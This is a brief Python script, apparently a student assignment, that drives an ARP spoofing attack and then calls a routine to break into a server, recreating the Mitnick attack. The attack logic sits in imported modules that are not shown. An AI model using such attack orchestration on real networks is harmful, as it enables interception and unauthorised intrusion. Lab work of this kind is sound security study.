#trabalho feito por Leonardo da Silva Camargo GRR20203903
import mitnick
import multiprocessing
import time
import configs_pc

def main():
    """
    Função principal que executa o ataque ARP spoofing e a invasão ao servidor.
    """
    interface = configs_pc.interface()
    end_mac = configs_pc.end_mac()
    configs_pc.arp_s() 
 
    # Inicia o ARP spoofing em um processo separado
    ThreadArp = multiprocessing.Process(target=mitnick.arp_spoofing, args=(interface, end_mac))
    ThreadArp.start()

    # Dorme para garantir que as tabelas de IP já estejam preparadas
    time.sleep(1.0)

    # Hackeia o servidor
    mitnick.invade(interface)

    # Termina o processo de ARP spoofing
    ThreadArp.terminate()

if __name__ == "__main__":
    main()